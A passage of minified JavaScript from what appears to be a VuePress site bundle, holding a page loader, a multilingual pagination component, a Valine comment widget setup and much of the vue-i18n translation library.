0-37.75494459-36.9345906-68.35043303-82.4922232-68.34111062-45.57627738-0.00932239-82.52019037 30.59548842-82.51086798 68.34111062z","p-id":"5406"}})])])])}),[],!1,null,"c6073ba8",null).exports),fn=(n(441),Object(Wt.a)({},(function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{attrs:{id:"loader-wrapper"}},[n("div",{staticClass:"loader-main"},e._l(4,(function(e){return n("div",{key:"out"+e})})),0),e._v(" "),e.$frontmatter.home?n("h3",{staticClass:"title"},[e._v(e._s(e.$site.title||e.$localeConfig.title))]):e._e(),e._v(" "),e.$frontmatter.home?n("p",{staticClass:"description"},[e._v(e._s(e.$site.description||e.$localeConfig.description))]):e._e()])}),[],!1,null,"d48f4d20",null).exports),mn=(n(442),{prev:"上一页",next:"下一页",go:"前往",jump:"跳转至"}),vn={prev:"上壹頁",next:"下壹頁",go:"前往",jump:"跳轉至"},bn={prev:"Prev",next:"Next",go:"Go",jump:"Jump To"},yn={prev:"前のページ",next:"次のページ",go:"へ",jump:"ジャンプ"},xn={prev:"이전 페이지",next:"다음 페이지",go:"행",jump:"건너뛰기"};var kn={data:function(){return{changePage:"",pageSize:10}},props:{total:{type:Number,default:10},perPage:{type:Number,default:10},currentPage:{type:Number,default:1}},computed:{pages:function(){var e=this.pageSize||this.perPage;return Math.ceil(this.total/e)},show:function(){return this.pages&&1!=this.pages},efont:function(){return!(this.pages<=7)&&this.currentPage>5},indexs:function(){var e=1,t=this.pages,n=[];for(this.pages>=7&&(this.currentPage>5&&this.currentPage<this.pages-4?(e=Number(this.currentPage)-3,t=Number(this.currentPage)+3):this.currentPage<=5?(e=1,t=7):(t=this.pages,e=this.pages-6));e<=t;)n.push(e),e++;return n},pagationLocales:function(){return t=(e=this).$lang,n=e.$recoLocales,(n=void 0===n?{}:n).pagation||(/^zh\-(CN|SG)$/.test(t)?mn:/^zh\-(HK|MO|TW)$/.test(t)?vn:/^ja\-JP$/.test(t)?yn:/^ko\-KR$/.test(t)?xn:bn);var e,t,n}},methods:{goPrev:function(){var e=this.currentPage;this.currentPage>1&&this.emit(--e)},goNext:function(){var e=this.currentPage;e<this.pages&&this.emit(++e)},jumpPage:function(e){var t=parseInt(e);t<=this.pages&&t>0?this.emit(t):alert("请输入大于0，并且小于".concat(this.pages,"的页码！"))},emit:function(e){this.$emit("getCurrentPage",e)}}},wn=(n(443),Object(Wt.a)(kn,(function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{directives:[{name:"show",rawName:"v-show",value:e.show,expression:"show"}],staticClass:"pagation"},[n("div",{staticClass:"pagation-list"},[n("span",{directives:[{name:"show",rawName:"v-show",value:e.currentPage>1,expression:"currentPage > 1"}],staticClass:"jump",attrs:{unselectable:"on"},on:{click:e.goPrev}},[e._v(e._s(e.pagationLocales.prev))]),e._v(" "),n("span",{directives:[{name:"show",rawName:"v-show",value:e.efont,expression:"efont"}],staticClass:"jump",on:{click:function(t){return e.jumpPage(1)}}},[e._v("1")]),e._v(" "),n("span",{directives:[{name:"show",rawName:"v-show",value:e.efont,expression:"efont"}],staticClass:"ellipsis"},[e._v("...")]),e._v(" "),e._l(e.indexs,(function(t){return n("span",{key:t,staticClass:"jump",class:{bgprimary:e.currentPage==t},on:{click:function(n){return e.jumpPage(t)}}},[e._v(e._s(t))])})),e._v(" "),n("span",{directives:[{name:"show",rawName:"v-show",value:e.efont&&e.currentPage<e.pages-4,expression:"efont&&currentPage<pages-4"}],staticClass:"ellipsis"},[e._v("...")]),e._v(" "),n("span",{directives:[{name:"show",rawName:"v-show",value:e.efont&&e.currentPage<e.pages-4,expression:"efont&&currentPage<pages-4"}],staticClass:"jump",on:{click:function(t){return e.jumpPage(e.pages)}}},[e._v(e._s(e.pages))]),e._v(" "),n("span",{directives:[{name:"show",rawName:"v-show",value:e.currentPage<e.pages,expression:"currentPage < pages"}],staticClass:"jump",on:{click:e.goNext}},[e._v(e._s(e.pagationLocales.next))]),e._v(" "),n("span",{staticClass:"jumppoint"},[e._v(e._s(e.pagationLocales.jump))]),e._v(" "),n("span",{staticClass:"jumpinp"},[n("input",{directives:[{name:"model",rawName:"v-model",value:e.changePage,expression:"changePage"}],attrs:{type:"text"},domProps:{value:e.changePage},on:{input:function(t){t.target.composing||(e.changePage=t.target.value)}}})]),e._v(" "),n("span",{staticClass:"jump gobtn",on:{click:function(t){return e.jumpPage(e.changePage)}}},[e._v(e._s(e.pagationLocales.go))])],2)])}),[],!1,null,"094d08e4",null).exports),Sn={name:"Valine",props:{options:{type:Object,default:function(){return{}}}},mounted:function(){this.initValine()},methods:{initValine:function(){new(n(444))(Object(Jt.a)({el:"#valine",placeholder:"just go go",notify:!1,verify:!1,avatar:"retro",visitor:!0,recordIP:!1,path:window.location.pathname},this.options))}},watch:{$route:function(e,t){var n=this;e.path!==t.path&&setTimeout((function(){n.initValine()}),300)}}},_n=(n(445),Object(Wt.a)(Sn,(function(){var e=this.$createElement;this._self._c;return this._m(0)}),[function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticClass:"valine-wrapper"},[t("div",{attrs:{id:"valine"}})])}],!1,null,null,null).exports),Tn=n(3);function jn(e){return Object(Tn.a)((function(t,n){void 0===t.inject&&(t.inject={}),Array.isArray(t.inject)||(t.inject[n]=e||n)}))}function Pn(e){return"function"!=typeof e||!e.managed&&!e.managedReactive}function Cn(e){var t=function(){var n=this,r="function"==typeof e?e.call(this):e;for(var a in(r=Object.create(r||null))[En]=Object.create(this[En]||{}),t.managed)r[t.managed[a]]=this[a];var o=function(e){r[t.managedReactive[e]]=i[e],Object.defineProperty(r[En],t.managedReactive[e],{enumerable:!0,configurable:!0,get:function(){return n[e]}})},i=this;for(var a in t.managedReactive)o(a);return r};return t.managed={},t.managedReactive={},t}var En="__reactiveInject__";function An(e){Array.isArray(e.inject)||(e.inject=e.inject||{},e.inject[En]={from:En,default:{}})}var On="undefined"!=typeof Reflect&&void 0!==Reflect.getMetadata;function In(e,t,n){if(On&&!Array.isArray(e)&&"function"!=typeof e&&!e.hasOwnProperty("type")&&void 0===e.type){var r=Reflect.getMetadata("design:type",t,n);r!==Object&&(e.type=r)}}function Ln(e){return void 0===e&&(e={}),function(t,n){In(e,t,n),Object(Tn.a)((function(t,n){(t.props||(t.props={}))[n]=e}))(t,n)}}function Mn(e,t){void 0===t&&(t={});var n=t.deep,r=void 0!==n&&n,a=t.immediate,o=void 0!==a&&a;return Object(Tn.a)((function(t,n){"object"!=typeof t.watch&&(t.watch=Object.create(null));var a=t.watch;"object"!=typeof a[e]||Array.isArray(a[e])?void 0===a[e]&&(a[e]=[]):a[e]=[a[e]],a[e].push({handler:n,deep:r,immediate:o})}))}var Rn=n(57);const Dn=e=>Object(Rn.stringify)(e),Nn=(e,t)=>`${e}${Object(Rn.stringify)(t,{addQueryPrefix:!0})}`,$n=(e,t)=>`${e.replace(/\/$/,"")}/${t.replace(/^\//,"")}`;var Fn=n(266),Un=n.n(Fn);const Bn=e=>Un()(e,"YYYY-MM-DD HH:mm:ss"),Hn=e=>(e.split("#")[0]||"").split("?")[0]||"",qn=e=>Object(Rn.parse)(e,{ignoreQueryPrefix:!0})
/*!
 * vue-i18n v8.22.4 
 * (c) 2021 kazuya kawaguchi
 * Released under the MIT License.
 */;var zn=["compactDisplay","currency","currencyDisplay","currencySign","localeMatcher","notation","numberingSystem","signDisplay","style","unit","unitDisplay","useGrouping","minimumIntegerDigits","minimumFractionDigits","maximumFractionDigits","minimumSignificantDigits","maximumSignificantDigits"];function Jn(e,t){"undefined"!=typeof console&&(console.warn("[vue-i18n] "+e),t&&console.warn(t.stack))}var Vn=Array.isArray;function Wn(e){return null!==e&&"object"==typeof e}function Kn(e){return"string"==typeof e}var Gn=Object.prototype.toString;function Qn(e){return"[object Object]"===Gn.call(e)}function Zn(e){return null==e}function Yn(e){return"function"==typeof e}function Xn(){for(var e=[],t=arguments.length;t--;)e[t]=arguments[t];var n=null,r=null;return 1===e.length?Wn(e[0])||Vn(e[0])?r=e[0]:"string"==typeof e[0]&&(n=e[0]):2===e.length&&("string"==typeof e[0]&&(n=e[0]),(Wn(e[1])||Vn(e[1]))&&(r=e[1])),{locale:n,params:r}}function er(e){return JSON.parse(JSON.stringify(e))}function tr(e,t){return!!~e.indexOf(t)}var nr=Object.prototype.hasOwnProperty;function rr(e,t){return nr.call(e,t)}function ar(e){for(var t=arguments,n=Object(e),r=1;r<arguments.length;r++){var a=t[r];if(null!=a){var o=void 0;for(o in a)rr(a,o)&&(Wn(a[o])?n[o]=ar(n[o],a[o]):n[o]=a[o])}}return n}function or(e,t){if(e===t)return!0;var n=Wn(e),r=Wn(t);if(!n||!r)return!n&&!r&&String(e)===String(t);try{var a=Vn(e),o=Vn(t);if(a&&o)return e.length===t.length&&e.every((function(e,n){return or(e,t[n])}));if(a||o)return!1;var i=Object.keys(e),s=Object.keys(t);return i.length===s.length&&i.every((function(n){return or(e[n],t[n])}))}catch(e){return!1}}function ir(e){return null!=e&&Object.keys(e).forEach((function(t){"string"==typeof e[t]&&(e[t]=e[t].replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&apos;"))})),e}var sr={beforeCreate:function(){var e=this.$options;if(e.i18n=e.i18n||(e.__i18n?{}:null),e.i18n)if(e.i18n instanceof Dr){if(e.__i18n)try{var t=e.i18n&&e.i18n.messages?e.i18n.messages:{};e.__i18n.forEach((function(e){t=ar(t,JSON.parse(e))})),Object.keys(t).forEach((function(n){e.i18n.mergeLocaleMessage(n,t[n])}))}catch(e){0}this._i18n=e.i18n,this._i18nWatcher=this._i18n.watchI18nData()}else if(Qn(e.i18n)){var n=this.$root&&this.$root.$i18n&&this.$root.$i18n instanceof Dr?this.$root.$i18n:null;if(n&&(e.i18n.root=this.$root,e.i18n.formatter=n.formatter,e.i18n.fallbackLocale=n.fallbackLocale,e.i18n.formatFallbackMessages=n.formatFallbackMessages,e.i18n.silentTranslationWarn=n.silentTranslationWarn,e.i18n.silentFallbackWarn=n.silentFallbackWarn,e.i18n.pluralizationRules=n.pluralizationRules,e.i18n.preserveDirectiveContent=n.preserveDirectiveContent),e.__i18n)try{var r=e.i18n&&e.i18n.messages?e.i18n.messages:{};e.__i18n.forEach((function(e){r=ar(r,JSON.parse(e))})),e.i18n.messages=r}catch(e){0}var a=e.i18n.sharedMessages;a&&Qn(a)&&(e.i18n.messages=ar(e.i18n.messages,a)),this._i18n=new Dr(e.i18n),this._i18nWatcher=this._i18n.watchI18nData(),(void 0===e.i18n.sync||e.i18n.sync)&&(this._localeWatcher=this.$i18n.watchLocale()),n&&n.onComponentInstanceCreated(this._i18n)}else 0;else this.$root&&this.$root.$i18n&&this.$root.$i18n instanceof Dr?this._i18n=this.$root.$i18n:e.parent&&e.parent.$i18n&&e.parent.$i18n instanceof Dr&&(this._i18n=e.parent.$i18n)},beforeMount:function(){var e=this.$options;e.i18n=e.i18n||(e.__i18n?{}:null),e.i18n?(e.i18n instanceof Dr||Qn(e.i18n))&&(this._i18n.subscribeDataChanging(this),this._subscribing=!0):(this.$root&&this.$root.$i18n&&this.$root.$i18n instanceof Dr||e.parent&&e.parent.$i18n&&e.parent.$i18n instanceof Dr)&&(this._i18n.subscribeDataChanging(this),this._subscribing=!0)},beforeDestroy:function(){if(this._i18n){var e=this;this.$nextTick((function(){e._subscribing&&(e._i18n.unsubscribeDataChanging(e),delete e._subscribing),e._i18nWatcher&&(e._i18nWatcher(),e._i18n.destroyVM(),delete e._i18nWatcher),e._localeWatcher&&(e._localeWatcher(),delete e._localeWatcher)}))}}},lr={name:"i18n",functional:!0,props:{tag:{type:[String,Boolean,Object],default:"span"},path:{type:String,required:!0},locale:{type:String},places:{type:[Array,Object]}},render:function(e,t){var n=t.data,r=t.parent,a=t.props,o=t.slots,i=r.$i18n;if(i){var s=a.path,l=a.locale,c=a.places,u=o(),p=i.i(s,l,function(e){var t;for(t in e)if("default"!==t)return!1;return Boolean(t)}(u)||c?function(e,t){var n=t?function(e){0;return Array.isArray(e)?e.reduce(ur,{}):Object.assign({},e)}(t):{};if(!e)return n;var r=(e=e.filter((function(e){return e.tag||""!==e.text.trim()}))).every(pr);0;return e.reduce(r?cr:ur,n)}(u.default,c):u),d=a.tag&&!0!==a.tag||!1===a.tag?a.tag:"span";return d?e(d,n,p):p}}};function cr(e,t){return t.data&&t.data.attrs&&t.data.attrs.place&&(e[t.data.attrs.place]=t),e}function ur(e,t,n){return e[n]=t,e}function pr(e){return Boolean(e.data&&e.data.attrs&&e.data.attrs.place)}var dr,gr={name:"i18n-n",functional:!0,props:{tag:{type:[String,Boolean,Object],default:"span"},value:{type:Number,required:!0},format:{type:[String,Object]},locale:{type:String}},render:function(e,t){var n=t.props,r=t.parent,a=t.data,o=r.$i18n;if(!o)return null;var i=null,s=null;Kn(n.format)?i=n.format:Wn(n.format)&&(n.format.key&&(i=n.format.key),s=Object.keys(n.format).reduce((function(e,t){var r;return tr(zn,t)?Object.assign({},e,((r={})[t]=n.format[t],r)):e}),null));var l=n.locale||o.locale,c=o._ntp(n.value,l,i,s),u=c.map((function(e,t){var n,r=a.scopedSlots&&a.scopedSlots[e.type];return r?r(((n={})[e.type]=e.value,n.index=t,n.parts=c,n)):e.value})),p=n.tag&&!0!==n.tag||!1===n.tag?n.tag:"span";return p?e(p,{attrs:a.attrs,class:a.class,staticClass:a.staticClass},u):u}};function hr(e,t,n){vr(e,n)&&br(e,t,n)}function fr(e,t,n,r){if(vr(e,n)){var a=n.context.$i18n;(function(e,t){var n=t.context;return e._locale===n.$i18n.locale})(e,n)&&or(t.value,t.oldValue)&&or(e._localeMessage,a.getLocaleMessage(a.locale))||br(e,t,n)}}function mr(e,t,n,r){if(n.context){var a=n.context.$i18n||{};t.modifiers.preserve||a.preserveDirectiveContent||(e.textContent=""),e._vt=void 0,delete e._vt,e._locale=void 0,delete e._locale,e._localeMessage=void 0,delete e._localeMessage}else Jn("Vue instance does not exists in VNode context")}function vr(e,t){var n=t.context;return n?!!n.$i18n||(Jn("VueI18n instance does not exists in Vue instance"),!1):(Jn("Vue instance does not exists in VNode context"),!1)}function br(e,t,n){var r,a,o=function(e){var t,n,r,a;Kn(e)?t=e:Qn(e)&&(t=e.path,n=e.locale,r=e.args,a=e.choice);return{path:t,locale:n,args:r,choice:a}}(t.value),i=o.path,s=o.locale,l=o.args,c=o.choice;if(i||s||l)if(i){var u=n.context;e._vt=e.textContent=null!=c?(r=u.$i18n).tc.apply(r,[i,c].concat(yr(s,l))):(a=u.$i18n).t.apply(a,[i].concat(yr(s,l))),e._locale=u.$i18n.locale,e._localeMessage=u.$i18n.getLocaleMessage(u.$i18n.locale)}else Jn("`path` is required in v-t directive");else Jn("value type not supported")}function yr(e,t){var n=[];return e&&n.push(e),t&&(Array.isArray(t)||Qn(t))&&n.push(t),n}function xr(e){xr.installed=!0;var t;(dr=e).version&&Number(dr.version.split(".")[0]);(t=dr).prototype.hasOwnProperty("$i18n")||Object.defineProperty(t.prototype,"$i18n",{get:function(){return this._i18n}}),t.prototype.$t=function(e){for(var t=[],n=arguments.length-1;n-- >0;)t[n]=arguments[n+1];var r=this.$i18n;return r._t.apply(r,[e,r.locale,r._getMessages(),this].concat(t))},t.prototype.$tc=function(e,t){for(var n=[],r=arguments.length-2;r-- >0;)n[r]=arguments[r+2];var a=this.$i18n;return a._tc.apply(a,[e,a.locale,a._getMessages(),this,t].concat(n))},t.prototype.$te=function(e,t){var n=this.$i18n;return n._te(e,n.locale,n._getMessages(),t)},t.prototype.$d=function(e){for(var t,n=[],r=arguments.length-1;r-- >0;)n[r]=arguments[r+1];return(t=this.$i18n).d.apply(t,[e].concat(n))},t.prototype.$n=function(e){for(var t,n=[],r=arguments.length-1;r-- >0;)n[r]=arguments[r+1];return(t=this.$i18n).n.apply(t,[e].concat(n))},dr.mixin(sr),dr.directive("t",{bind:hr,update:fr,unbind:mr}),dr.component(lr.name,lr),dr.component(gr.name,gr),dr.config.optionMergeStrategies.i18n=function(e,t){return void 0===t?e:t}}var kr=function(){this._caches=Object.create(null)};kr.prototype.interpolate=function(e,t){if(!t)return[e];var n=this._caches[e];return n||(n=function(e){var t=[],n=0,r="";for(;n<e.length;){var a=e[n++];if("{"===a){r&&t.push({type:"text",value:r}),r="";var o="";for(a=e[n++];void 0!==a&&"}"!==a;)o+=a,a=e[n++];var i="}"===a,s=wr.test(o)?"list":i&&Sr.test(o)?"named":"unknown";t.push({value:o,type:s})}else"%"===a?"{"!==e[n]&&(r+=a):r+=a}return r&&t.push({type:"text",value:r}),t}(e),this._caches[e]=n),function(e,t){var n=[],r=0,a=Array.isArray(t)?"list":Wn(t)?"named":"unknown";if("unknown"===a)return n;for(;r<e.length;){var o=e[r];switch(o.type){case"text":n.push(o.value);break;case"list":n.push(t[parseInt(o.value,10)]);break;case"named":"named"===a&&n.push(t[o.value]);break;case"unknown":0}r++}return n}(n,t)};var wr=/^(?:\d)+/,Sr=/^(?:\w)+/;var _r=[];_r[0]={ws:[0],ident:[3,0],"[":[4],eof:[7]},_r[1]={ws:[1],".":[2],"[":[4],eof:[7]},_r[2]={ws:[2],ident:[3,0],0:[3,0],number:[3,0]},_r[3]={ident:[3,0],0:[3,0],number:[3,0],ws:[1,1],".":[2,1],"[":[4,1],eof:[7,1]},_r[4]={"'":[5,0],'"':[6,0],"[":[4,2],"]":[1,3],eof:8,else:[4,0]},_r[5]={"'":[4,0],eof:8,else:[5,0]},_r[6]={'"':[4,0],eof:8,else:[6,0]};var Tr=/^\s?(?:true|false|-?[\d.]+|'[^']*'|"[^"]*")\s?$/;function jr(e){if(null==e)return"eof";switch(e.charCodeAt(0)){case 91:case 93:case 46:case 34:case 39:return e;case 95:case 36:case 45:return"ident";case 9:case 10:case 13:case 160:case 65279:case 8232:case 8233:return"ws"}return"ident"}function Pr(e){var t,n,r,a=e.trim();return("0"!==e.charAt(0)||!isNaN(e))&&(r=a,Tr.test(r)?(n=(t=a).charCodeAt(0))!==t.charCodeAt(t.length-1)||34!==n&&39!==n?t:t.slice(1,-1):"*"+a)}var Cr=function(){this._cache=Object.create(null)};Cr.prototype.parsePath=function(e){var t=this._cache[e];return t||(t=function(e){var t,n,r,a,o,i,s,l=[],c=-1,u=0,p=0,d=[];function g(){var t=e[c+1];if(5===u&&"'"===t||6===u&&'"'===t)return c++,r="\\"+t,d[0](),!0}for(d[1]=function(){void 0!==n&&(l.push(n),n=void 0)},d[0]=function(){void 0===n?n=r:n+=r},d[2]=function(){d[0](),p++},d[3]=function(){if(p>0)p--,u=4,d[0]();else{if(p=0,void 0===n)return!1;if(!1===(n=Pr(n)))return!1;d[1]()}};null!==u;)if(c++,"\\"!==(t=e[c])||!g()){if(a=jr(t),8===(o=(s=_r[u])[a]||s.else||8))return;if(u=o[0],(i=d[o[1]])&&(r=void 0===(r=o[2])?t:r,!1===i()))return;if(7===u)return l}}(e))&&(this._cache[e]=t),t||[]},Cr.prototype.getPathValue=function(e,t){if(!Wn(e))return null;var n=this.parsePath(t);if(0===n.length)return null;for(var r=n.length,a=e,o=0;o<r;){var i=a[n[o]];if(void 0===i)return null;a=i,o++}return a};var Er,Ar=/<\/?[\w\s="/.':;#-\/]+>/,Or=/(?:@(?:\.[a-z]+)?:(?:[\w\-_|.]+|\([\w\-_|.]+\)))/g,Ir=/^@(?:\.([a-z]+))?:/,Lr=/[()]/g,Mr={upper:function(e){return e.toLocaleUpperCase()},lower:function(e){return e.toLocaleLowerCase()},capitalize:function(e){return""+e.charAt(0).toLocaleUpperCase()+e.substr(1)}},Rr=new kr,Dr=function(e){var t=this;void 0===e&&(e={}),!dr&&"undefined"!=typeof window&&window.Vue&&xr(window.Vue);var n=e.locale||"en-US",r=!1!==e.fallbackLocale&&(e.fallbackLocale||"en-US"),a=e.messages||{},o=e.dateTimeFormats||{},i=e.numberFormats||{};this._vm=null,this._formatter=e.formatter||Rr,this._modifiers=e.modifiers||{},this._missing=e.missing||null,this._root=e.root||null,this._sync=void 0===e.sync||!!e.sync,this._fallbackRoot=void 0===e.fallbackRoot||!!e.fallbackRoot,this._formatFallbackMessages=void 0!==e.formatFallbackMessages&&!!e.formatFallbackMessages,this._silentTranslationWarn=void 0!==e.silentTranslationWarn&&e.silentTranslationWarn,this._silentFallbackWarn=void 0!==e.silentFallbackWarn&&!!e.silentFallbackWarn,this._dateTimeFormatters={},this._numberFormatters={},this._path=new Cr,this._dataListeners=[],this._componentInstanceCreatedListener=e.componentInstanceCreatedListener||null,this._preserveDirectiveContent=void 0!==e.preserveDirectiveContent&&!!e.preserveDirectiveContent,this.pluralizationRules=e.pluralizationRules||{},this._warnHtmlInMessage=e.warnHtmlInMessage||"off",this._postTranslation=e.postTranslation||null,this._escapeParameterHtml=e.escapeParameterHtml||!1,this.getChoiceIndex=function(e,n){var r=Object.getPrototypeOf(t);if(r&&r.getChoiceIndex)return r.getChoiceIndex.call(t,e,n);var a,o;return t.locale in t.pluralizationRules?t.pluralizationRules[t.locale].apply(t,[e,n]):(a=e,o=n,a=Math.abs(a),2===o?a?a>1?1:0:1:a?Math.min(a,2):0)},this._exist=function(e,n){return!(!e||!n)&&(!Zn(t._path.getPathValue(e,n))||!!e[n])},"warn"!==this._warnHtmlInMessage&&"error"!==this._warnHtmlInMessage||Object.keys(a).forEach((function(e){t._checkLocaleMessage(e,t._warnHtmlInMessage,a[e])})),this._initVM({locale:n,fallbackLocale:r,messages:a,dateTimeFormats:o,numberFormats:i})},Nr={vm:{configurable:!0},messages:{configurable:!0},dateTimeFormats:{configurable:!0},numberFormats:{configurable:!0},availableLocales:{configurable:!0},locale:{configurable:!0},fallbackLocale:{configurable:!0},formatFallbackMessages:{configurable:!0},missing:{configurable:!0},formatter:{configurable:!0},silentTranslationWarn:{configurable:!0},silentFallbackWarn:{configurable:!0},preserveDirectiveContent:{configurable:!0},warnHtmlInMessage:{configurable:!0},postTranslation:{configurable:!0}};Dr.prototype._checkLocaleMessage=function(e,t,n){var r=function(e,t,n,a){if(Qn(n))Object.keys(n).forEach((function(o){var i=n[o];Qn(i)?(a.push(o),a.push("."),r(e,t,i,a),a.pop(),a.pop()):(a.push(o),r(e,t,i,a),a.pop())}));else if(Vn(n))n.forEach((function(n,o){Qn(n)?(a.push("["+o+"]"),a.push("."),r(e,t,n,a),a.pop(),a.pop()):(a.push("["+o+"]"),r(e,t,n,a),a.pop())}));else if(Kn(n)){if(Ar.test(n)){var o="Detected HTML in message '"+n+"' of keypath '"+a.join("")+"' at '"+t+"'. Consider component interpolation with '<i18n>' to avoid XSS. See https://bit.ly/2ZqJzkp";"warn"===e?Jn(o):"error"===e&&function(e,t){"undefined"!=typeof console&&(console.error("[vue-i18n] "+e),t&&console.error(t.stack))}(o)}}};r(t,e,n,[])},Dr.prototype._initVM=function(e){var t=dr.config.silent;dr.config.silent=!0,this._vm=new dr({data:e}),dr.config.silent=t},Dr.prototype.destroyVM=function(){this._vm.$destroy()},Dr.prototype.subscribeDataChanging=function(e){this._dataListeners.push(e)},Dr.prototype.unsubscribeDataChanging=function(e){!function(e,t){if(e.length){var n=e.indexOf(t);if(n>-1)e.splice(n,1)}}(this._dataListeners,e)},Dr.prototype.watchI18nData=function(){var e=this;return this._vm.$watch("$data",(function(){for(var t=e._dataListeners.length;t--;)dr.nextTick((function(){e._dataListeners[t]&&e._dataListeners[t].$forceUpdate()}))}),{deep:!0})},Dr.prototype.watchLocale=function(){if(!this._sync||!this._root)return null;var e=this._vm;return this._root.$i18n.vm.$watch("locale",(function(t){e.$set(e,"locale",t),e.$forceUpdate()}),{immediate:!0})},Dr.prototype.onComponentInstanceCreated=function(e){this._componentInstanceCreatedListener&&this._componentInstanceCreatedListener(e,this)},Nr.vm.get=function(){return this._vm},Nr.messages.get=function(){return er(this._getMessages())},Nr.dateTimeFormats.get=function(){return er(this._getDateTimeFormats())},Nr.numberFormats.get=function(){return er(this._getNumberFormats())},Nr.availableLocales.get=function(){return Object.keys(this.messages).sort()},Nr.locale.get=function(){return this._vm.locale},Nr.locale.set=function(e){this._vm.$set(this._vm,"locale",e)},Nr.fallbackLocale.get=function(){return this._vm.fallbackLocale},Nr.fallbackLocale.set=function(e){this._localeChainCache={},this._vm.$set(this._vm,"fallbackLocale",e)},Nr.formatFallbackMessages.get=function(){return this._formatFallbackMessages},Nr.formatFallbackMessages.set=function(e){this._formatFallbackMessages=e},Nr.missing.get=function(){return this._missing},Nr.missing.set=function(e){this._missing=e},Nr.formatter.get=function(){return this._formatter},Nr.formatter.set=function(e){this._formatter=e},Nr.silentTranslationWarn.get=function(){return this._silentTranslationWarn},Nr.silentTranslationWarn.set=function(e){this._silentTranslationWarn=e},Nr.silentFallbackWarn.get=function(){return this._silentFallbackWarn},Nr.silentFallbackWarn.set=function(e){this._silentFallbackWarn=e},Nr.preserveDirectiveContent.get=function(){return this._preserveDirectiveContent},Nr.preserveDirectiveContent.set=function(e){this._preserveDirectiveContent=e},Nr.warnHtmlInMessage.get=function(){return this._warnHtmlInMessage},Nr.warnHtmlInMessage.set=function(e){var t=this,n=this._warnHtmlInMessage;if(this._warnHtmlInMessage=e,n!==e&&("warn"===e||"error"===e)){var r=this._getMessages();Object.keys(r).forEach((function(e){t._checkLocaleMessage(e,t._warnHtmlInMessage,r[e])}))}},Nr.postTranslation.get=function(){return this._postTranslation},Nr.postTranslation.set=function(e){this._postTranslation=e},Dr.prototype._getMessages=function(){return this._vm.messages},Dr.prototype._getDateTimeFormats=function(){return this._vm.dateTimeFormats},Dr.prototype._getNumberFormats=function(){return this._vm.numberFormats},Dr.prototype._warnDefault=function(e,t,n,r,a,o){if(!Zn(n))return n;if(this._missing){var i=this._missing.apply(null,[e,t,r,a]);if(Kn(i))return i}else 0;if(this._formatFallbackMessages){var s=Xn.apply(void 0,a);return this._render(t,o,s.params,t)}return t},Dr.prototype._isFallbackRoot=function(e){return!e&&!Zn(this._root)&&this._fallbackRoot},Dr.prototype._isSilentFallbackWarn=function(e){return this._silentFallbackWarn instanceof RegExp?this._silentFallbackWarn.test(e):this._silentFallbackWarn},Dr.prototype._isSilentFallback=function(e,t){return this._isSilentFallbackWarn(t)&&(this._isFallbackRoot()||e!==this.fallbackLocale)},Dr.prototype._isSilentTranslationWarn=function(e){return this._silentTranslationWarn instanceof RegExp?this._silentTranslationWarn.test(e):this._silentTranslationWarn},Dr.prototype._interpolate=function(e,t,n,r,a,o,i){if(!t)return null;var s,l=this._path.getPathValue(t,n);if(Vn(l)||Qn(l))return l;if(Zn(l)){if(!Qn(t))return null;if(!Kn(s=t[n])&&!Yn(s))return null}else{if(!Kn(l)&&!Yn(l))return null;s=l}return Kn(s)&&(s.indexOf("@:")>=0||s.indexOf("@.")>=0)&&(s=this._link(e,t,s,r,"raw",o,i)),this._render(s,a,o,n)},Dr.prototype._link=function(e,t,n,r,a,o,i){var s=n,l=s.match(Or);for(var c in l)if(l.hasOwnProperty(c)){var u=l[c],p=u.match(Ir),d=p[0],g=p[1],h=u.replace(d,"").replace(Lr,"");if(tr(i,h))return s;i.push(h);var f=this._interpolate(e,t,h,r,"raw"===a?"string":a,"raw"===a?void 0:o,i);if(this._isFallbackRoot(f)){if(!this._root)throw Error("unexpected error");var m=this._root.$i18n;f=m._translate(m._getMessages(),m.locale,m.fallbackLocale,h,r,a,o)}f=this._warnDefault(e,h,f,r,Vn(o)?o:[o],a),this._modifiers.hasOwnProperty(g)?f=this._modifiers[g](f):Mr.hasOwnProperty(g)&&(f=Mr[g](f)),i.pop(),s=f?s.replace(u,f):s}return s},Dr.prototype._createMessageContext=function(e){var t=Vn(e)?e:[],n=Wn(e)?e:{};return{list:function(e){return t[e]},named:function(e){return n[e]}}},Dr.prototype._render=function(e,t,n,r){if(Yn(e))return e(this._createMessageContext(n));var a=this._formatter.interpolate(e,n,r);return a||(a=Rr.interpolate(e,n,r)),"string"!==t||Kn(a)?a:a.join("")},Dr.prototype._appendItemToChain=function(e,t,n){var r=!1;return tr(e,t)||(r=!0,t&&(r="!"!==t[t.length-1],t=t.replace(/!/g,""),e.push(t),n&&n[t]&&(r=n[t]))),r},Dr.prototype._appendLocaleToChain=function(e,t,n){var r,a=t.split("-");do{var o=a.join("-");r=this._appendItemToChain(e,o,n),a.splice(-1,1)}while(a.length&&!0===r);return r},Dr.prototype._appendBlockToChain=function(e,t,n){for(var r=!0,a=0;a<t.length&&"boolean"==typeof r;a++){var o=t[a];Kn(o)&&(r=this._appendLocaleToChain(e,o,n))}return r},Dr.prototype._getLocaleChain=function(e,t){if(""===e)return[];this._localeChainCache||(this._localeChainCache={});var n=this._localeChainCache[e];if(!n){t||(t=this.fallbackLocale),n=[];for(var r,a=[e];Vn(a);)a=this._appendBlockToChain(n,a,t);(a=Kn(r=Vn(t)?t:Wn(t)?t.default?t.default:null:t)?[r]:r)&&this._appendBlockToChain(n,a,null),this._localeChainCache[e]=n}return n},Dr.prototype._translate=function(e,t,n,r,a,o,i){for(var s,l=this._getLocaleChain(t,n),c=0;c<l.length;c++){var u=l[c];if(!Zn(s=this._interpolate(u,e[u],r,a,o,i,[r])))return s}return null},Dr.prototype._t=function(e,t,n,r){for(var a,o=[],i=arguments.length-4;i-- >0;)o[i]=arguments[i+4];if(!e)return"";var s=Xn.apply(void 0,o);this._escapeParameterHtml&&(s.params=ir(s.params));var l=s.locale||t,c=this._translate(n,l,this.fallbackLocale,e,r,"string",s.params);if(this._isFallbackRoot(c)){if(!this._root)throw Error("unexpected error");return(a=this._root).$t.apply(a,[e].concat(o))}return c=this._warnDefault(l,e,c,r,o,"string"),this._postTranslation&&null!=c&&(c=this._postTranslation(c,e)),c},Dr.prototype.t=function(e){for(var t,n=[],r=arguments.length-1;r-- 